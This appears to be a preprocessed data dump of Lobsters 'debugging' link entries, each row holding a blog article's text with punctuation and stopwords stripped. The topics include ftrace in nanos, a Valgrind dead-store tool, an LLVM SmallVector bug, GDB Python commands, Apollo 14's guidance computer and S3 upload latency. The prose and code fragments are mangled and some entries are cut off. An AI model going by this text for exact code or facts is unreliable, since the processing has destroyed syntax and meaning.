tree specify env var trace ftrace race built nanos default make target called ahem target specifies given binary run pair filesystemimage manifest f deserves blogpost normal user never think though make clean make traceftrace targetmyserver run specifying trace target spawn webserver ftracetrace endpoint another reason toggable default present ops proper wget http download tracefile option collect however aware even modest amount traffic produce large trace file remember goal fix live prod system replicate behavior controlled environment debug locally know become thing ditch staging environment debug prod even lol code prod precisely staging envs run first little python script format trace csv parsetracepy trace produce nice little tracecsv produce graph like runtimebreakdownpy tracecsv get nice little graph like like perhaps future turn via toggle ops right mostly meaningless nt elbow deep nanos code performance nut love diving could obviously use help get next time
112,Lobsters,debugging,Debugging,Watching for software inefficiencies with Valgrind,https://kristerw.blogspot.com/2020/02/watching-for-software-inefficiencies.html,watching software inefficiency valgrind,watching software inefficiency witch deadstores valgrind tool deadstores use tool logfile valgrind core option limitation implementation detail structure instrumentation callback todo,software inefficiency often show wasteful memory operation many research tool detect various case one tool described paper watching software inefficiency witch using intel cpu performance monitoring unit pmu debug register find dead store writing value never read silent store writing value already present memory location silent load reading unchanged value memory previously read deadsilent memory operation problematic analyzed program would likely become slower tried get rid making code complicated case mostly dead store form p expensivecomputation may make sense reorganize code expensive computation value needed thought would fun play witch tool need custom linux kernel found complicated set always wanted learn write valgrind tool writing witchlike tool seemed like good beginner project although main contribution witch paper without performance overhead definitely case using deadstores valgrind tool valgrind tool deadstores gather data instruction reading writing memory store record many byte written many byte read memory overwritten made invalid calling free etc also record many time instruction executed many wrote value load record many time instruction executed many read value previously read reason dead store tracked byte granularity want able find obsolete writeonly structure element never read example structure struct int b c foo code initializing structure memset foo sizeof foo compiler usually optimize memset one simd instruction clearing bit program read three value see byte dead instruction granularity would detect stored value partly used silent load store however tracked instruction granularity reason byte granularity would report spurious silent loadsstores example sum int variable containing value add sum would reported silent store used byte granularity three byte operation use tool deadstores tool used way valgrind tool valgrind tooldeadstores valgrindoptions yourprog yourprogoptions program analyze must built debug symbol g better optimization enabled order produce relevant data also need fnoomitframepointer passing usestacktraceyes see tool result written json file containing data collected run example python script scriptprintresultpy extract top n instruction dead store silent store silent load name output file per default deadstoresout pid pid program process id changed deadstoresoutfile filename p q n format specifier used embed process id content environment variable andor sequence number name way core option logfile tool per default track instruction readwrite memory often useful tends report thing like byteswritten bytesread bytesdead nofstores nofsilent dead store come memset implementation libc value sum call memset program helpful want find dead store eliminate tool instead track loadsstores stack trace split reported data instruction according called byteswritten bytesread bytesdead nofstores nofsilent poisonpages scratchgcctrunkbuildgcc ggccollect scratchgcctrunkbuildgcc cgraphnode finalizefunction treenode bool scratchgcctrunkbuildgcc expandordeferfn treenode scratchgcctrunkbuildgcc byteswritten bytesread bytesdead nofstores nofsilent ggcinternalclearedalloc unsigned long void void unsigned long unsigned long scratchgcctrunkbuildgcc makenode treecode scratchgcctrunkbuildgcc buildtreelist treenode treenode scratchgcctrunkbuildgcc cpparserparameterdeclarationlist cpparser int scratchgcctrunkbuildgcc enabled usestacktraceyes general make result much useful tool much program analyze must compiled width frame pointer support fnoomitframepointer order get reliable result valgrind core option also supported tracechildrenyes useful analyzing program gcc start subprocesses using exec system call limitation valgrind optimal framework writing kind tool reason work translating assembly instruction internal targetindependent representation analyzedinstrumented tool translation preserve detail instruction problem instruction example simple addition instruction add rcx rax translated natural way ir instruction adding two value instruction translated way cause problem example bit test instruction bt rax generated sequence storing byte unused address stack reading back one byte result get get stack pointer put stle store byte ldle load byte get put put put put put make deadstores tool treat store byte worked around particular case ignoring store offset stack pointer hold pointer stack frame normal function memory access relevant tool anyway may additional case found one limitation deadstores tool tracking silent load handle memory address stored detect silent load readonly data segment could fixed tracking valid memory way done memcheck tool implementation detail structure tool keep track statistic instruction readingwriting memory number byte written number time executed etc status byte written track stored value later read rewritten value statistic instruction kept node structure struct node handle parent handle left handle right enum color color struct key key store long byteswritten long bytesread long nofstores long nofsilentstores load long nofloads long nofsilentloads node structure stored array called node node organized redblack tree keyed address instruction rather generalized address contains top address stack trace usestacktraceyes used tree structure managed parent left right field conceptually pointer node structure using handle index node array make valid even need realloc node array increase size byte accessed program get addrinfo structure address allocated block address block stored hash table addrinfotable struct addrinfo unsigned storeinstrh unsigned iswritten addrinfo structure contains bit telling byte valid written invalidated memory freeed etc handle instruction wrote byte program use many loadstore instruction handle stored bit make structure structure fit bit make big difference tracing memoryhungry program instrumentation valgrind work transforming binary code internal representation ir tool add instrumentation ir valgrind jitcompiles executes code deadstores tool add instrumentation function dsinstrument code dsinstrument iterates ir find instruction access memory important istwrtemp load iststore store others atomic compareandswap istcas instruction instrumented using istdirty ir instruction used call helper function deadstores tool one helper function tracking dead store silent store load instruction writes memory get dead store silent store helper function silent store helper function must called first helper function used deadstores tool take three parameter address size memory access address instruction function tracking dead store update counter instruction instruction executed written size byte status written byte written instruction wrote value static void deadstoretracker addr addr sizet size addr iaddr handle h iaddr node h nofstores node h byteswritten size sizet size struct addrinfo ai addr ai iswritten true ai storeinstrh h load tracking check byte storeinstrh see instruction wrote byte different instruction corresponding handle bytesread counter incremented byte storeinstrh set mark read byte written zero storeinstrh load silent load instruction counter updated accordingly static void loadtracker addr addr sizet size addr iaddr sizet silentload sizet size struct addrinfo ai addr ai storeinstrh node ai storeinstrh bytesread ai storeinstrh else ai iswritten silentload handle h iaddr node h nofloads silentload size node h nofsilentloads tracking silent store need bit work must compare value original memory newly written done helper function done inserting new ir comparison helper function called unless value identical functionality partially supported valgrind istdirty instruction optional guard parameter taking ir expression determining function called thing needed generate comparison pas guard comparison straight forward emit st irexpr pointer iststore ir comparison emitted irexpr data st iststoredata irtype type typeofirexpr tyenv data irexpr addr st iststoreaddr tlassert type irexpr load emitload sb type addr irexpr guard emitbinop sb data load emitfunctions simple wrapper around valgrind api get rid boilerplate code sb ir superblock containing instruction one input dsinstrument thing left silent store tracker check address written order prevent reporting spurious silent store example first write malloced memory luck happens contain value stored instruction update instruction silentstores counter static void silentstoretracker addr addr sizet size addr iaddr bool iswritten true sizet size struct addrinfo ai addr iswritten iswritten ai iswritten iswritten handle h iaddr node h nofsilentstores callback possible register callback valgrind call various thing done ir instrumentation tool must better common mechanism example tracknewmemstack trackdiememstack called time stack pointer decreasedincreased needsmallocreplacement callback called program calling malloc free etc deadstores tool using order mark memory invalid clearing iswritten flag prevent counter incorrectly updated silent loadstore tracking example previously freed memory returned malloc todo many thing could improved tool slow done profiling would guess time spent easy improve done add test suite better tracking valid memory described limitation section better tracking variable structure automatically find writeonly variable structure element finding type inefficiency memcpy program could used original data expect anytime soon main goal learn write valgrind
113,Lobsters,debugging,Debugging,Too much locality... for stores to forward,https://www.pvk.ca/Blog/2020/02/01/too-much-locality-for-store-forwarding/,much locality store forward,cake reference backtraceio fold semi group robin hood linear probing block observation perf hit hypothesis dataflow graph plan order instruction ahead travis down looked forwarding scenario travis point twitter experiment throughput easier problem latency pipeline insert loop software software prefetching backtrace dashboard,apology failed cake reference refer travis down investigation pathological case forwarding responsible backtraceio crash analytic database couple month focused recent effort improving query time inmemory grouped aggregation ie archetypal mapreduce usecase generate keyvalue pair fold value key semi group cute cacheefficient data structure type workload inner loop simply insert small hash table robin hood linear probing order guarantee entry table ordered hash value ordering let u easily dump entry sorted order block merge loop arbitrary number sorted array unified larger ordered hash table dump sorted array observation updated operator use data structure noticed spending lot time inner loop fact perf showed query server whole spending cpu time one instruction loop movdqu rbx lea annotated function mov rbx rax movaps rsp first thing note instructionlevel profiling tends put blame instruction following one triggered sampling interrupt lea computes slow movdqu movdqu loading maybe normal cache miss something inherent workload turned source location hit perf report observed instruction simply copying stack argument passed address source clearly showed argument hot cache inner loop essentially generate new keyvalue pair mangle kv pair bit turn hash element insert new hash element movdqu happens step c copy element step b constructed point important question suggests matter could simply increase size base case speed rest bottomup eventually latency random access initial hash table dominate inner loop look performance deep inner loop goal thing better big win experience come additional design freedom get able find new us code improved latency throughput memory footprint really shine increased optionality multiple improvement compound let u consider much larger design space project whole wanted make sure hash table insertion loop worked wide set parameter possible give future ability combine versatile tool hypothesis back original question spend many cycle loading data wrote cache answer question title post little time elapses instruction write data cache one read data modern outoforder machine eg chip execute multiple instruction time start executing instruction soon operand ready even earlier instruction program order still waiting machine code essentially messy way encode dataflow graph mean job microoptimisers high level avoid long dependency chain make dataflow graph wide possible hard distribute much scheduling slack possible node chain order absorb knockon effect cache miss latency spike fail chip often find instruction ready execute stalling pipeline like like slowing factor initial inner loop simply executes step b c order step c depends result step b step b step theory chip wide enough instruction reordering window could pipeline multiple loop iteration practice real hardware plan order instruction ahead mechanism depends branch predicted correctly explicitly insert slack dataflow schedule must distribute well enough instruction reordering see gap specific instance particularly bad case contemporary machine step b populates entry regular register writes step c copy byte vector read writes travis down looked forwarding scenario found readafterwrite setup behaves badly intel amd probably movdqu vector load instruction issue compiler emitted copy gpr read writes might enough hardware hide latency however travis point twitter hard compiler get right across compilation unit case reliable passing large struct value hoping compiler avoid mismatched instruction powerful tool fix source level schedule operation manually dataflow graph loop iteration currently pure chain v v v v one add slack chain bounded queue experiment first fix add oneelement buffer step b c inner loop became generate new keyvalue pair insert hash element previous iteration mangle kv pair stash buffer etc yield dataflow graph like v v v v introduced slack step b step c previous iteration step b c shifted step next iteration long delay definition value use data likely evicted however enough work available keep pipeline busy useful work c wait b result b nice singledigit improvement query latency internal benchmark permuting loop oneelement buffer help clearly experiment buffer size found impactful speedup array element insert hash table focus bulk insert maybe element instead trying improve latency individual writes focus throughput multiple insert good throughput easier problem latency current case passing whole buffer hash table code made easier pipeline insert loop software compute hash ahead time accelerate random access hash table software prefetching profile new inner loop flatter hottest part follows mov rsp rdx lea rax rdx cmp rsp blame slow instruction hit following instruction lea multiplying cmp slow load stack prefetch good news instruction dependent prefetching used side effect moreover come block code pipelined software executes one full iteration ahead side effect might useful really matter instruction slow still far critical path last restructuring yielded speedup slow query described two tool use regularly optimising code contemporary hardware finding way scatter around scheduling slack always useful software real life planning one simple way add bounded buffer flush buffer soon fill refill become empty instead waiting next write buffer however think powerful transformation using buffering expose bulk operation tends open opportunity thing loop case found speedup someone visit backtrace dashboard couple time day add hour two end year tl dr function hot enough look worth asking called often order focus higher level bulk operation
114,Lobsters,debugging,Debugging,"Emulator bug? No, LLVM bug",https://cookieplmonster.github.io/2020/02/01/emulator-bug-llvm-bug/,emulator bug llvm bug,deeper dive code consistently unable reproduce crash shallow dive code llvm deeper dive code smallvector major proposed fix stability reference work success proposed fix removing temporary diff file also result success final word one solution,backstory scroll deeper dive code section today test subject started crash found randomly testing one demo fifa demo game run really well pc building really big spu cache minute playtime would result spu object cached take later save cpu time actually playing nice worked fine first try trying compile next boot compiles cached spu object startup subsequent session perform better need work runtime would consistently crash emulator even worse seem alone issue user testing game issue thankfully able test one pc differ cpu main pc intel cpu core thread pc consistent crash another pc intel cpu core thread pc unable reproduce crash looking difference two cpu could identify two possible cause cpu core presence first claim could tested easily modifying cpu affinity second could verified configuring ignore presence sadly neither got closer root cause still would crash whereas would refuse work even tried transfer cache variable affected cpu affinity could reduce likelihood crash messing seemed counterintuitive core thus thread reducing unrelated first glance classic race condition hardware dependent somewhat random unpredictable shallow dive code trying debugger attached result could observed quickly crashing always call stack llvm runtimedyldelf resolverelocation class llvm sectionentry const unsigned unsigned unsigned int unsigned unsigned int llvm runtimedyldelf processrelocationref unsigned int class llvm object contentiterator class llvm object relocationref class llvm object objectfile const class std map class llvm object sectionref unsigned int struct std le class llvm object sectionref class std allocator struct std pair class llvm object sectionref const unsigned int class std map class llvm relocationvalueref unsigned struct std le class llvm relocationvalueref class std allocator struct std pair class llvm relocationvalueref const unsigned llvm runtimedyldimpl loadobjectimpl class llvm object objectfile const llvm runtimedyldelf loadobject class llvm object objectfile const llvm runtimedyld loadobject class llvm object objectfile const llvm mcjit generatecodeformodule class llvm module jitcompiler add std uniqueptr llvm module std defaultdelete llvm module module line spullvmrecompiler compile spuprogram func line even crashing inside code instead crashing inside llvm code llvm used compile translated ppuspu code host machine assembly case critical part emulator yet crashing deep inside llvm code either bug llvm feed wrong input causing crash sadly may see callstack sourceline information stripped llvm library proceed need run debug deeper dive code turn llvm compiled debug test redone sure enough call stack detailed time also source information retained llvm support endian write unsigned void memory unsigned int value llvm support endianness endian line llvm support endian write unsigned void memory unsigned int value line llvm support detail packedendianspecificintegral unsigned ref operator unsigned int newvalue line llvm runtimedyldelf const llvm sectionentry section unsigned offset unsigned value unsigned int type addend unsigned symoffset line llvm runtimedyldelf resolverelocation const llvm sectionentry section unsigned offset unsigned value unsigned int type addend unsigned symoffset unsigned int sectionid line llvm runtimedyldelf processrelocationref unsigned int sectionid llvm object contentiterator llvm object relocationref reli const llvm object objectfile std map llvm object sectionref unsigned int std le llvm object sectionref std allocator std pair llvm object sectionref const unsigned int objsectiontoid std map llvm relocationvalueref unsigned std le llvm relocationvalueref std allocator std pair llvm relocationvalueref const unsigned stub line llvm runtimedyldimpl loadobjectimpl const llvm object objectfile obj line llvm runtimedyldelf loadobject const llvm object objectfile line llvm runtimedyld loadobject const llvm object objectfile obj line llvm mcjit generatecodeformodule llvm module line jitcompiler add std uniqueptr llvm module std defaultdelete llvm module module line spullvmrecompiler compile spuprogram func line unhandled exception access violation reading location classic access violation attempting reference invalid memory curiously one argument crashing functionm void memory equal look like suspicious value random garbage move call stack runtimedyldimpl function one argument const sectionentry section reveals ｕｓｅ ａｆｔｅｒ running debug build freed memory filled ddh thanks easily identifiable memory likely yield invalid value used evidenced case help however section freed runtimedyldimpl processrelocationref provides answer sectionentry section section sectionid section member class runtimedyldimpl defined list section emitted dynamic linker section referenced code mean index list sectionid typedef smallvector sectionentry sectionlist sectionlist section llvm type smallvector used similar std vector unlike stl container llvm one allows allocate space entry front space dynamically allocated entry need stored case seems like instance section stored le entry optimization made reduce computation cost le frequent reallocation sadly also seems hidden major bug vector usually reallocate time storing reference one element local variable fine problem arise one function called function processrelocationref long function add element vector might cause vector grow invalidating reference problem vectorlike type smallvector concealed problem preallocating entry case never reallocates exactly happens proven changing preallocation size section element causing reallocation trigger quickly indeed crash becoming nearly unavoidable solve either need stability reference need stop assuming element move proposed fix stability reference looking code seems like section need allow random access std list question thankfully container allows random access guarantee reference stability growing std deque change way simple change type recompile llvm run game woop woop work one work consistently release debug without page heap elevates memory issue success best solution though vector fault issue lie assumption relocate let try something else proposed fix removing temporary another way possibly fix would remove code assuming vector relocate case mean likely need say goodbye section local variable easy refactor sense compiler complain fully done long sectionid never change simple copy paste change case thankfully appears immutable class member diff file quite long replaced en masse compiling testing also result success turn caching reference local variable root issue along drop compilation never fails dequebased fix final word issue fixed proposed fix clean enough think point fair say unlikely problem always impossible approaching serious doubt bug llvm well tested widely used library turn wrong approach issue happen everywhere time writing post nekotekina adopted one solution llvm fork issue yet reported upstream llvm
116,Lobsters,debugging,Debugging,GDB Custom Commands: Dynamic Arrays,https://testfit.io/devblog/gdb_custom_commands_dynamic_arrays,gdb custom command dynamic array,introduction boilerplate meaty bit super meaty bit result python extension documentation back hiring,introduction c shop nt easy access fancy data structure time nt problem work small data set task nt require anything crazy say business array love array life array module mostly set macro using extra data hidden behind typed array pointer approach purpose post need know function arraysize uh get size array access array element using typical array index approach anyways since use array much would pretty fetch favorite debugger gdb could understand array let try print command abbreviated p array integer gdb print value int ahh nothing soothes soul like hex value memory address array occasionally useful usually want actual value stored array gdb would nt useful debugger nt support gdb print value would expected familiar c print first value array could also print value individually using value tedious want see value gdb p arraysize value gdb p value much better typical way print multiple sequential value gdb given often need examine data like would nice simple command something like pa printarray forcing type extra character time osha violation boilerplate luckily gdb support extension written python hello world version custom command look like class printarray gdbcommand def init self gdbcommandinit self pa gdbcommanddata gdbcompletesymbol true def invoke self arg fromtty print hello world printarray noteworthy item far pa name gave command print call save file printarraypy tell gdb run script using source command could run every time launch gdb gdbinit file run automatically launch gdb look file place user home directory current working directory whichever location choose add following line source printarraypy also execute command gdb running come handy testing change script anyways running gdb pa hello world pack job finished meaty bit printing hello world last paragraph prefer real logic def invoke self arg fromtty args gdbstringtoargv arg len args print need array print return said real logic pointer args size int gdbparseandeval arraysize pointer gdbexecute p size size print empty else gdbexecute p pointer size perfection parseandeval let u send expression back gdb evaluation unlike execute return result instead executing like normal gdb command since return gdbvalue type purpose le useful plain old integer cast result gdb pa value like super meaty bit nice time printing array integer struct value int somuchdata int interestingvalue int seriouslystopthisiswaytoomuchdata printing array structs work output pretty verbose large structs long array may even get anything gdb pa value error occurred python command value requires byte maxvaluesize tell gdb raise limit wo nt solve verbosity problem time happens want know value struct member every item array able focus particular field exclude others size print empty elif len args gdbexecute p pointer size else member args statement p range size statement statement pointer member statement gdbexecute statement optionally provide specific struct member custom command gdb print value element combining one statement instead calling execute element tell gdb still print array gdb pa value interestingvalue examine multiple member call command multiple time personally like ergonomics better passing multiple struct member single command result final script suitably tailored copyandpasting pleasure class printarray gdbcommand def init self gdbcommandinit self pa gdbcommanddata gdbcompletesymbol true def invoke self arg fromtty args gdbstringtoargv arg len args print need array print return pointer args size int gdbparseandeval arraysize pointer gdbexecute p size size print empty elif len args gdbexecute p pointer size else member args statement p range size statement statement pointer member statement gdbexecute statement printarray printing array useful nt incredibly exciting however good introduction whole new world extending gdb spend much time python today risk catching serious case memory bloat information gdb online python extension documentation wellwritten semicolon harmed production post back sound interesting hiring
117,Lobsters,debugging,Debugging,"A deep dive into the Apollo Guidance Computer, and the hack that saved Apollo 14",https://arstechnica.com/science/2020/01/a-deep-dive-into-the-apollo-guidance-computer-and-the-hack-that-saved-apollo-14/,deep dive apollo guidance computer hack saved apollo,enlarge cradle aviation museum fra mauro highland copernicus mare imbrium harrowing flight apollo guenter wendt colonel klink helmet past prologue sivb third stage translunar injection attempted dock lonely spectacular death vab crawlertransporter pad launch umbilical tower apollo guidance computer laid bare computer like core rope memory enlarge,enlarge source trouble abort pushbutton along companion abort stage pushbutton particular image lm simulator currently residing cradle aviation museum long islandfrank obrien commanded alan shepard original mercury astronaut make moon apollo mission apollo reflight apollo abandoned lunar landing plan accompanied lunar module pilot ed mitchell command module pilot stu roosa shepard target fra mauro highland hilly area near lunar equator south giant crater copernicus likely created ejecta thrown mare imbrium formed fra mauro site thought potentially contain material deep inside moon could shed light companion satellite origin eight month since harrowing flight apollo engineer made several change spacecraft reduce chance another explosion happening help ensure crew could make home another emergency occurred additional oxygen tank battery added unplanned pause also allowed time software update added lunar module computer particularly welcome addition ability computer recognize change height surface approach landing site new capability computer would confused undulating terrain vehicle headed toward landing crew apollo saturn v rollout january left right lunar module pilot ed mitchell commander al shepard command module pilot stu roosa apollo official crew portrait taken december mitchell shepard roosa prepare simulation run kennedy space center january launch five day away shepard front lm simulator ksc january prelaunch breakfast morning january clockwise left lmp ed mitchell chief astronaut tom stafford cmp stu roosa cdr al shepard flight crew operation chief deke slayton backup lmp joe engle backup cmp ron evans cdr shepard suitup launch cmp roosa looking pensive suitup apollo crew walking hallway toward transfer van crew boarding transfer van take waiting saturn v launch vehicle crew standing white room outside capsule pad leader guenter wendt traditional prelaunch gift exchange crew got wendt colonel klink helmet wendt got shepard nod fact went well shepard become oldest human walk moon past prologue afternoon january flight thundered away kennedy space center saturn v launch vehicle brief minute hold weather restarting sivb third stage translunar injection tli command module kitty hawk crew way moon serious problem cropped almost immediately tli kitty hawk attempted dock mission lunar module antares fingernailsized latch docking probe used connect command module lunar module failed catch two spacecraft unable dock repeated attempt kitty hawk able capture securely attach antares afterwards sivb sent way lonely spectacular death combined apollo spacecraft continued voyage fra mauro four day transit time spent lunar orbit least uneventful flight moon could insertion lunar orbit occurred hour flight conserve precious fuel lm combined spacecraft lowered orbit nine mile kilometer periapsis several hour later preparation descent started next day activation checkout lm however le four hour scheduled landing controller noticed according indication console mission control lm abort pushbutton appeared pressed asked via radio shepard confirmed one board antares pressed abort meant shortcircuit electrical issue somewhere inside lm complicated gut potentially missionending problem button pressed engine firing lm would immediately begin abort procedure soon lunar descent started making landing impossible saturn v would send apollo moon roll vab crawlertransporter headed pad photo taken morning november pad countdown demonstration test january claw way slowly skyward january image apollo launch taken camera high red launch umbilical tower command module kitty hawk clearly visible top shrouded white boost protective cover third stage vent propellent prior lm extraction lunar module antares visible still nestled spacecraft lunar module adapter area front stage wideangle mission operation control room manned spacecraft center houston lm extraction troubleshooting note rightmost screen front room showing antares still awaiting extraction sivb hard time pressure ground quickly figure wrong devise workaround came brilliant computer hack entire apollo program possibly entire history electronic computing explain exactly hack functioned issue facing developer creation need dig deep apollo guidance computer worked hold onto hat ar going apollo guidance computer laid bare common find agc often described mere calculator compared controller chip suitable watch microwave looking watch tell time little else chip drive microwave blindly start stop magnetron heat expired kung pao chicken device limited interaction surrounding hardware sophisticated computation decisionmaking note describing computer one expects system would include ability attribute contemporary ability run several program example present simple yet intuitive interface control wide variety device gracefully recover application error ha might exclaim carry computer like pocket idea capability available nearly year ago stretch credulity apollo guidance computer feature interpreter process virtual machine similar java byte code check ability remote data update yup given capability quite reasonable argue agc compare favorably modern smartphone yes agc slower far le memory due unfortunate timing birth wrong end moore law curve although processor approximately instruction per second especially fast impossible overemphasize impact scarce memory agc software developer consider limit programmer software flight moon back fit word bit long plus bit parity readonly core rope memory byte concept agc bit word accessed easy way break word smaller division enlarge number ibm disk drive white ibm card reader punch photographed secondary storage option disk unit size washing machine could even fit spacecraft tape storage reliable viable option considered far late development cycle included design agc software entirely contained within corerope module housed inside agc box measuring long wide tall addition word readonly memory core programming agc trivial word operating system process management recovery global variable mission phase shoehorned amongst meager amount ram dedicated memory area used application program software performed guidance navigation task landing moon rendezvous basic program allowed whopping seven word temporary variable misprint constraint mind easy cynical facing task installing latest multigigabyte application laptop listing image frank obrien aurich lawson
118,Lobsters,debugging,Debugging,yabfig: a gdb-like debugger for Brainfuck,https://humaidq.ae/projects/yabfig/,yabfig gdblike debugger brainfuck,go back yabfig description bf requirement copying contributing download install usage change log,go back yabfig description yabfig bf interpreter written go also extended lint code removing uninterpreted character include gdbstyle interpreter requirement following package must installed system go tested git copying contributing program written humaid alqassimi distributed bsd clause license download install go get u gitsrhthumaidyabfig go install gitsrhthumaidyabfig usage usage yabfig option file option lint lint format brainfuck file removing space noninstruction character output standard output debug run interactive gdbstyle debugger run example program helloworldbf yabfig programshelloworldbf using debugger set breakpoints yabfig debug programshelloworldbf yabfig debugger brainfuck command similar gdb type help list compatible command yabfigdbg help list command run run program print po print value memory position next count execute next instruction jump po jump program position resume break po add breakpoint program position clear po delete breakpoint program position watch n x set watchpoint memory position n x kill kill program execution yabfigdbg b breakpoint position yabfigdbg b breakpoint position yabfigdbg b breakpoint position yabfigdbg r running program programshelloworldbf hello worldbreakpoint hit position yabfigdbg c breakpoint hit position yabfigdbg c breakpoint hit position yabfigdbg c program exited yabfigdbg change log mar mar added linter added unit test interpreter struct method mar add godoc move interpreter separate package mar add simple gdbstyle debugger improve interpreter function
120,Lobsters,debugging,Debugging,Debugging Through WebAssembly Is Impossible,https://erikmcclure.com/blog/debugging-through-webassembly-is-impossible/,debugging webassembly impossible,innative sourcemaps available chrome dwarf webassembly standard well documented reference type remote gdb debugger next webassembly meeting,recently added primitive debugging support innative allow step original source code execution via sourcemaps client however expressed need proper variable inspection original c code distinct current debugging method available chrome firefox let examine current webassembly local original language using webassembly plugin system make sense want toolchain allows debugging compiled webassembly one stepping original c source codeit turn basically impossible without modifying llvm making work pdb file might actually impossible given format constraint none lack debugging information least debug mode llvm necessary using new dwarf webassembly standard debug optimized webassembly type information included stack offset variable name source file line information information needthe problem debugger understands webassembly pointer webassembly us linear memory section encodes loadstore operation zerobased offset beginning memory section could anywhere mean two value required calculate actual location memory basememory offsetnow unlike llvm dwarf actually well documented problem documentation make clear get exactly one custom value work whatever pushed top dwarf location expression value must exist hardware register architecture abidependent builtin value constant llvm make extremely hard actually gaurantee specific hardware register get assigned anything even harder make sure nt get clobbered wildly impractical even targeting still builtin value like dwatframebase might help problemwe ca nt redirect dwatframebase somewhere else becuase currently pointing real function framebase compiled function entirely valid stack still need able find ca nt use dwatstaticlink coupled frame base still need exist would need value specific hardcoded address could accessed via dwopaddr order acquire memory base pointer inside expression totally incompatible relocatable binary simply way access offset global base memory pointer dwarf expression without loading global base memory pointer registerokay fine nail base memory location single hardcoded location since compiling webassembly binary user machine dynamically pick location memory know free hardcode binary need one custom value offset rest convincing debugger add x byte memory locationdwarf provides several way cleanest would likely use dwatdatalocation intended situation problem ca nt applied raw pointer type could try use dwtagptrtomembertype trying perform wrong operation okay fine convert pointer struct type contain type pointed either use dwatdatalocation struct type derive correct location use dwatdatamemberlocation contained typeunfortunately u llvm ca nt emit dwatdatalocation hardcodes dwatdatamemberlocation simple byte offset start structure fact almost every useful data location parameter might able encode location expression nt actually supported llvm hardcoded specific operation llvm nt even consider dwopaddr valid operator probably binary relocation given constraint get creativewhat tell debugger offset pointer let dereference pointer obviously invalid memory location near beginning memory offset type contained inside struct base memory location end result would contained struct member happened offset billion byte land correct part memory would work pdb file unfortunately bit offset struct member stored value dwarf pdb file visual studio debugger appears use signed integer offset calculation result technique work memory address fit inside bitsnormally hardcoded offset like one would reserve gigabyte memory maximum amount wasm binary utilize every single module would work fine would nt actually use much memory layout virtual address space ensures wo nt run limited mean load single module maximum memory size require maximum memory size loaded module tightly packedthe second problem even though dwarf let specify size pointer loading visual studio nt care always assume pointer architecture result order make technique work compile nonstandard mode offset stored integer technically work result horrid consider constraint already much farfetched idea come mind unfortunately none viable one idea would allocate lowest addressable page window using virtualalloc convince clang compile executable whose low address boundary instead allocate memory command could allocate memory starting actually return offset turn webassembly offset true addressable pointersat minimum idea requires modifying clang parameter hidden however also nt solve function pointer problem webassembly function also referenced offset offset relative completely seperate function table ca nt address one would need offset past end moment function table ca nt grow sticking front actual linear memory region might work immediately fall apart reference type added would also convince clang skip function index generating webassemblyanother option would take advantage c program compiled webassembly clang maintains global variable store current stack frame program constant offset could add initial value stack frame custom malloc implementation return offset include base memory offset simply change memoryload wasm operation add base memory offset effect turning webassembly offset true pointer still requires compiling unfortunately c model also store globals referred hardcoded value linear memory space would extremely difficult differentiate normal integer constantsall idea extremely fragile immediately break upon trying support multiple memory space extensible function table simple fact even modify llvm support dwarf operation minimum would nail memory location hardcoded address addition solution would work gdb forcing use visual studio remote gdb debugger window suggested webassembly dwarf extension wo nt even sufficient deal multiple linear memory table need encode linear memory table given value supposed belong toi discussing issue next webassembly meeting posting article vain hope actually completely wrong invoking cunningham law perhaps someone comment section somewhere miraculously provide solution overlookeduntil happens debugging language webassembly impossible order convince llvm generate pdbs first place must add module flag magic string codeview string exist constant anywhere outside llvm function check existence documentation anywhere explains found digging clang source code probably page entire internet tell thisfor bonus point llvm also mention llvmdbgdeclare deprecated wo nt use llvmdbgaddr unless set hidden command line parameter function directly check command line parameter making almost impossible set programmatically
122,Lobsters,debugging,Debugging,Lucidity – an interactive program-state visualizer,http://symbolflux.com/luciditystory.html,lucidity interactive programstate visualizer,tiled text developed rsi kant lakoff johnson another example previous section art prolog,year wrapping tiled text project moving berkeley colorado grew working parttime small startup producing new impractical idea breakneck pace probably developed idea prior lucidity programming language impudently naming ia intellagent lucidity came determination would need order build ia lot could said ia sum project came tiled text project wellreceived reinforcing idea might something important try spotty eclectic knowledge subject c overly lacking connection ai programming language fact teenager read society mind couple others tried eg writing java program agi since developed ingrained habit observing thinking feedback handful topic cognition refining model interested thinking work thought might unique insight fact developed rsi prevented viewing computer programming something would reliably able career forcing explore wider range subject particular time absorbed topic within philosophy general linguistics part new friend making around berkeley result unsurprisingly ambitious almost certainly doomed fail concept based heady mixture idea could individually categorized interesting b mistaken c already wellestablished ignorance notwithstanding analogy first number builtin type used bootstrap cognition using set innate relation including relation course partially inspired questionable interpretation kant lakoff johnson idea behind definition analogy generalize reparticularize original away structure stay though thing related structure allowed change two block prefixed one list parameter add thing type whereas second block purpose remove thing via constraint mean first block provides stone second carves produced page handwritten note full modeling trial syntax experiment general fairly detailed design language runtime expressed primarily term algorithm pile interesting data structure parse operation going parse generate thing nt necessarily sequence since one type relation perstructure node fsm related allowing complex constraint parameter type eg quantification chair must leg prior experience methodological preference writing program another example appeared main problem settling design runtime need mean visualizing dynamic state wide range data structure would monumental task build visualization utility could create general system captured requirement problem might become managable lucidity supposed general system image mind bear strong resemblence story previous section though using get easyrich feedback indevelopment algorithm rather learn new system scratch ia project important realization ambitious intellectual working outside academic institution set apparently beautiful idea much larger set beautiful idea real value easy judge idea valuable mark feel something important critical step practical verification completed realized couple year later reading art prolog idea liked best language probably poor approximation prolog plenty unique still bet odds significance originally imagined optimistic
123,Lobsters,debugging,Debugging,AWS S3: You’re out of order,https://m.signalvnoise.com/aws-s3-youre-out-of-order/,aws order,mtr wireshark tshark selective acknowledgement sack detail sack panic,back november noticed something odd happening large uploads amazon uploads would pause second time resume u baffled started dig found left u question answer aws networking use amazon file storage basecamp product store file primary region replicated secondary region ensures aws region becomes unavailable switch region little impact user uploading downloading file back november started notice really long latency uploading large file basecamp primary region uploading file use multipart api upload file multiple segment uploads normally take second saw segment take second upload retries logged eventually file would uploaded successfully aws retries aws retries aws retries aws retries application run onpremise ashburn va datacenter push traffic redundant amazon direct connects chicago il datacenter push public internet surprise testing uploads chicago datacenter see increased upload time since saw horrible upload time going secondary region made decision temporarily promote primary region using user longer feeling pain high upload time still needed get bottom opened support case initial indication direct connection causing slowness pushing uploads however testing mtr able rule direct connect packet loss latency culprit aws escalated case internally started analyze tcp exchange upload file first thing needed repeatable easy way upload file taking time build set proper tooling diagnosing issue really pay long run case built simple tool us ruby library production application ensured testing would close production possible also included support multiple region benchmarking actual uploads expected uploads uswest region slow irb main region user system total real running upload test used tcpdump output tcp traffic could read wireshark tshark tcpdump dst port w analyzing tcpdump using wireshark found something interesting tcp retransmissions getting somewhere tcp retransmissions analysis tshark gave u full story seeing many 